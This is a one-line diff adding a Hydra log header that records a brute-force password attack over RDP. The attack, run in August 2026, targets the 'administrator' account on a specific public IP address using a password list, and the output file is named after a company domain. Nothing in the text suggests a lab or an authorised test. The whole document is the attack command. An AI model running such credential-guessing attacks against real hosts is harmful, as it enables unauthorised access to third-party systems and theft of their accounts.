@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-08-01 10:23:36 on 121.41.0.118 rdp (hydra -l administrator -P /tmp/precise_pass.txt -t 1 -W 3 -o /tmp/rdp_jiehua-chem.com.txt rdp://121.41.0.118)
